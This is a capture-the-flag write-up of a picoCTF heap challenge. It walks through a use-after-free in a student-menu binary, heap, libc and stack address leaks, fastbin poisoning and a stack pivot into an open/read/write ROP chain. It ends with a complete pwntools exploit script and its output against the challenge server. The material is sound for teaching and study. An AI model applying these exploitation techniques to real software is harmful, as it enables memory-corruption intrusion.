  pbVar2 = std::operator<<((basic_ostream *)std::cout,
                           PTR_s__/$$$$$$_/$$$$$$_/$$___$$_/$$$__$_00303010);
  std::basic_ostream<char,std::char_traits<char>>::operator<<
            ((basic_ostream<char,std::char_traits<char>> *)pbVar2,
             std::endl<char,std::char_traits<char>>);
  do {
    pbVar2 = std::operator<<((basic_ostream *)std::cout,
                             PTR_s_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_00303018);
    std::basic_ostream<char,std::char_traits<char>>::operator<<
              ((basic_ostream<char,std::char_traits<char>> *)pbVar2,
               std::endl<char,std::char_traits<char>>);
    this = (basic_istream<char,std::char_traits<char>> *)
           std::basic_istream<char,std::char_traits<char>>::operator>>
                     ((basic_istream<char,std::char_traits<char>> *)std::cin,(int *)&menu_select);
    std::basic_istream<char,std::char_traits<char>>::operator>>(this,&student_index);
    cap_students_15(student_index);
    switch(menu_select) {
    case 0:
      pbVar2 = std::operator<<((basic_ostream *)std::cout,"virtual (0/1)? ");
      std::basic_ostream<char,std::char_traits<char>>::operator<<
                ((basic_ostream<char,std::char_traits<char>> *)pbVar2,
                 std::endl<char,std::char_traits<char>>);
      std::basic_istream<char,std::char_traits<char>>::operator>>
                ((basic_istream<char,std::char_traits<char>> *)std::cin,&is_virtual?);
      if (is_virtual? == 0) {
        ppsVar3 = (student *)operator.new(0x18);
        ppsVar3->study = (undefined **)0x0;
        ppsVar3->name = 0;
        ppsVar3->name_size = 0;
        create_student_not_virtual(ppsVar3);
        (&students?)[student_index] = (student **)ppsVar3;
      }
      else {
        if (is_virtual? != 1) {
                    /* WARNING: Subroutine does not return */
          abort();
        }
        puVar3 = (student *)operator.new(0x18);
        puVar3->study = (undefined **)0x0;
        puVar3->name = 0;
        puVar3->name_size = 0;
        create_student_virtual(puVar3);
        (&students?)[student_index] = (student **)puVar3;
      }
      break;
    case 1:
      set_name((student *)(&students?)[student_index]);
      break;
    case 2:
      print_name((student *)(&students?)[student_index]);
      break;
    case 3:
      (*(code *)(*(&students?)[student_index])->study)((&students?)[student_index]);
      break;
    case 4:
      psVar1 = (student *)(&students?)[student_index];
      if (psVar1 != (student *)0x0) {
        cleanup_student(psVar1);
        operator.delete(psVar1,0x18);
      }
      break;
    default:
                    /* WARNING: Subroutine does not return */
      abort();
    }
  } while( true );
}
```
Besides the obvious menu options, there are a few things to note. It's under some pretty onerous seccomp restrictions and also it calls alarm(0x1e) so it will terminate after 30 seconds. I patched out my local copy so I could develop without that messing me up. 

```text
❯ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0012
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000005  if (A == fstat) goto 0011
 0009: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0011
 0010: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
 ```

We have five menu options. Our input is a menu option and an index (to a table of students) to operate on. 

### create a student

Creating a student will allocate memory of size 0x18 and then fill it out. 
```c
struct Student {
	void** function_ptr
	char* name
	long name_size		
}
```

Name and name size are both initialized to 0, function_ptr is allocated to one of two virtual functions depending on your input. This virtual function will either print out a newline or a brief sentence and then a newline. 

### set student name

Setting the student name will free the existing name, and then allow you to set a new name with a size of your choice. 

### print student name

Printing the student name will print the string pointed to by student->name, terminating at null. 

### "study"

"study" executes the function pointer in the student struct. 

### remote student

The remote student option will free the student name if it exists and then free the student. Importantly, it does not clean up the student global variable which means this is a use-after-free vulnerability. 

## so how do i exploit this?

We can take advantage of the UAF to get a student pointer sharing memory with an allocated name (which we control the data for). This means we can construct a fake student with arbitrary data. The process looks like this and it gets us arbitrary read and the ability to call arbitrary address (although the function pointer address gets dereferenced, so we need to actually put an address containing our target function)

1. allocate student 0
2. allocate student 1
3. free student 0
4. allocate name for student 1 of size 0x18 (student struct size)
5. construct a fake student object as name
6. exec function pointer or print name

This is a pretty hefty primitive, but not sufficient to really get anywhere. We're going to need more information to actually exploit this, so first order of business is to break ASLR/PIE. 

### leaking the heap base (and program base)

This is pretty similar to the concept I mentioned in the previous section for arbitrary read but requires some tcache manipulation to get everything working. The idea is to allocate a student and name, but that name is actually a chunk in tcache or student. The first 8 bytes in those would be a heap pointer (tcache linked list) or program address (virtual function) respectively. 

1. allocate student 0
2. allocate name for student 0 of size 0x18
3. fill 0x20 tcache to size 6
4. free student 0; the freeing process will delete the name before the student so the name will be in tcache and the student goes to fastbin. 
5. print student 0's name -- this will be a pointer on the heap and you can calculate the base from it
6. allocate student 1 -- this will pull the most recently entered chunk from tcache, which will be student 0's name. 
7. print student 0's name again -- now it's a pointer into program memory and we can calculate program base from it

### leaking libc and stack

Armed with the program base and an arbitrary read, it's pretty trivial to leak the base of libc from the GOT. We can then do something similar with libc.  Libc has two symbols which point onto the stack -- "\_\_libc_argv" and "environ".  We can just arbitrary read those and then calculate stack offsets off that. 

### arbitrary write?

I [poisoned fastbin](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c) to get malloc to return an arbitrary pointer. I found that I could only do this once because fastbin just sorta stopped filling and I'm not really familiar enough with heap exploitation to speculate as to why. Although potentially possible to fix, I ended up not bothering because I found a way to pivot the 24 byte write into an arbitrary length ROP. 

### pivoting onto a heap ROP chain

We have arbitrary write, but restricted to 24 bytes and can only do it once. What can we do with that? Can't use a one_gadget because of seccomp, highly likely we will need to construct our own chain to print the flag. Turns out, libc has a handy "pop rsp; ret;" gadget for us to play with. We can just allocate a big name, drop our ROP chain onto that, and then pivot stack onto that. At this point we have an arbitrarily large ROP chain and can just open/read/write our way to the flag. 

```text
❯ python solve.py REMOTE
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/chall.patch'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/sky/Dropbox/ctf/picomini-by-redpwn/vr-school/ld-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to mars.picoctf.net on port 31638: Done
[*] heap base: 0x561a01961000
[*] program base: 0x5619ffa9c000
[*] libc base: 0x7f63ad50c000
[*] stored RIP: 0x7fff1e4faad8
[*] Switching to interactive mode
picoCTF{0nl1ne_d3bat3_sux}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chall.patch")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("mars.picoctf.net", 31638)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript="c")
    else:
        return process([exe.path])

MENU_DELIM = b"4. Remote student\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n"

def leak_heap(r):

    # if we free and don't reallocate
    # the name pointer will be pointing to a tcache heap chunk
    # which has a pointer to the next chunk in that tcache
    # we can snag that with the name print

    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for x in range(24)]))

    # empty tcache and then create another student, allowing us to refill it to 6
    for i in range(6): 
        r.sendlineafter(MENU_DELIM, f"0 {i + 1} 0".encode())
    r.sendlineafter(MENU_DELIM, b"4 1")
    r.sendlineafter(MENU_DELIM, b"4 2")
    r.sendlineafter(MENU_DELIM, b"4 0")
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")

    heap_value = u64(r.recvline().rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    return heap_value - 0x13cf0

def leak_program_base(r):

    # student structs have a vtable ptr
    # lets just snag that and calculate program base

    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([b"48" for x in range(24)]))

    r.sendlineafter(MENU_DELIM, b"4 3") # students were populated when leaking heap, can just use one of those lol
    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"4 0")
    r.sendline(b"0 1 0")

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")

    program_value = u64(r.recvline().rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    return program_value - 0x202ce8

def leak_libc_base(r, program_base):

    # we can retrieve a libc address from the GOT
    # assuming we have the program base


    got_malloc_offset = 0x202f88

    r.sendline(b"0 0 0") # alloc student 0, 0 virtual

    r.sendlineafter(MENU_DELIM, b"0 1 0") 

    r.sendlineafter(MENU_DELIM, b"4 0")

    r.sendlineafter(MENU_DELIM, b"1 1 24") # set name for student 1, size 24

    fake_student = b"AAAAAAAA" + p64(program_base + got_malloc_offset) + p64(8)

    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")


    malloc_addr = u64(r.recv(6).rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")

    return malloc_addr - 0x97140 # offset of malloc from libc base

def leak_stack_base(r, libc_base):

    # libc has a variable "environ" which stores a stack address
    # since we know libc base, we can just yoink that


    r.sendline(b"0 0 0")

    r.sendlineafter(MENU_DELIM, b"0 1 0") 

    r.sendlineafter(MENU_DELIM, b"4 0")

    r.sendlineafter(MENU_DELIM, b"1 1 24")


    # 0x3ee098 is environ address
    fake_student = b"AAAAAAAA" + p64(libc_base + 0x3ee098) + p64(8)

    r.sendline(b" ".join([str(fake_student[x]).encode() for x in range(24)]))

    r.recvuntil(b"choice: \n")
    r.recvuntil(b"choice: \n")

    r.sendline(b"2 0")


    env_addr = u64(r.recv(6).rstrip().ljust(8,b"\x00"))

    r.recvuntil(b"choice: \n")
    
    return env_addr - 0x130 # -0x130 is the offset from environ to the set_name stored rip


def poison_fastbin(r, target, value):

    assert(len(value) == 24)


    # first we empty tcache

    for i in range(9):
        r.sendline(f"0 {i} 0".encode())
        r.recvuntil(b"choice: \n")

    for i in range(7):
        r.sendline(f"4 {2+i}".encode())
        r.recvuntil(b"choice: \n")

    # # now, to populate fastbins with a dupe

    r.sendline(b"4 0")
    r.sendline(b"4 1")
    r.sendline(b"4 0")

    for i in range(3):
        r.recvuntil(b"choice: \n")

    # # lets just empty tcache real quick

    for i in range(7):
        r.sendline(f"0 3 0".encode())
        r.recvuntil(b"choice: \n")

    r.sendline(b"1 0 24")


    # we have a duplicate chunk in fastbin
    # so what we want to do is write over the next pointer
    # allowing us to artificially extend fastbin
    # and tricking malloc into returning an arbitrary pointer

    dup_chunk = p64(target) + b"A" * 16
    r.sendline(b" ".join([str(dup_chunk[x]).encode() for x in range(24)]))

    # here we use up the rest of real fastbin so the next pointer is our fake pointer

    r.sendline(b"0 0 0")
    r.sendline(b"0 0 0")

    # allocate our fake pointer and write "value" to it

    r.sendlineafter(MENU_DELIM, b"1 0 24")
    r.sendline(b" ".join([str(value[x]).encode() for x in range(24)]))

    for i in range(4):
        r.recvuntil(b"choice: \n")


def main():
    r = conn()

    r.recvuntil(MENU_DELIM)


    # first, leak useful info
    # arbitrary read by way of type confusion
    # essentially we allocate and free a student
    # and then allocate a name of same size
    # these will share an address
    # and so we can construct a fake student
    # by controlling the name pointer in the student struct
    # we can read whatever we want

    heap_base = leak_heap(r)
    log.info("heap base: " + hex(heap_base))

    program_base = leak_program_base(r)
    log.info("program base: " + hex(program_base))

    libc_base = leak_libc_base(r, program_base)

    log.info("libc base: " + hex(libc_base))

    stack_ret = leak_stack_base(r, libc_base)

    log.info("stored RIP: " + hex(stack_ret))

    # all gadgets are from libc for convenience

    pop_rax = libc_base + 0x43ae8
    pop_rdi = libc_base + 0x215bf
    pop_rsi = libc_base + 0x23eea
    pop_rdx = libc_base + 0x1b96
    syscall_ret = libc_base + 0xd2745
    pop_rsp = libc_base + 0x3960


    # heap addresses are predictable and if you allocate in the same pattern
    # you can just reuse offsets

    flag_heap_addr = heap_base + 0x13630
    heap_rop_address = heap_base + 0x12dd0

    # find a nice empty chunk in rw program memory for the flag
    flag_read_address = program_base + 0x203048


    # open/read/write syscall chain

    chain = b""
    chain += p64(pop_rax) + p64(2)
    chain += p64(pop_rdi) + p64(flag_heap_addr)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(pop_rdx) + p64(0)
    chain += p64(syscall_ret)

    chain += p64(pop_rax) + p64(0)
    chain += p64(pop_rdi) + p64(3)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)

    chain += p64(pop_rax) + p64(1)
    chain += p64(pop_rdi) + p64(1)
    chain += p64(pop_rsi) + p64(flag_read_address)
    chain += p64(pop_rdx) + p64(64)
    chain += p64(syscall_ret)


    # put rop chain and "flag.txt" on heap
    # addresses are calculated in advance bc it's predictable

    r.sendline(b"0 15 0")
    r.sendline(b"1 15 500")
    r.sendline(b" ".join([str(x).encode() for x in chain.ljust(500,b"\x00")]))

    r.sendline(b"0 14 0")
    r.sendline(b"1 14 500")
    r.sendline(b" ".join([str(x).encode() for x in b"flag.txt".ljust(500,b"\x00")]))

    for i in range(3):
        r.recvuntil(b"choice: \n")

    poison_fastbin(r, stack_ret, p64(pop_rsp) + p64(heap_rop_address) + p64(0))


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

Neat challenge!  I'm stilling rather new to complex heap challenges so this fucked me up, but I had a good time working on it!  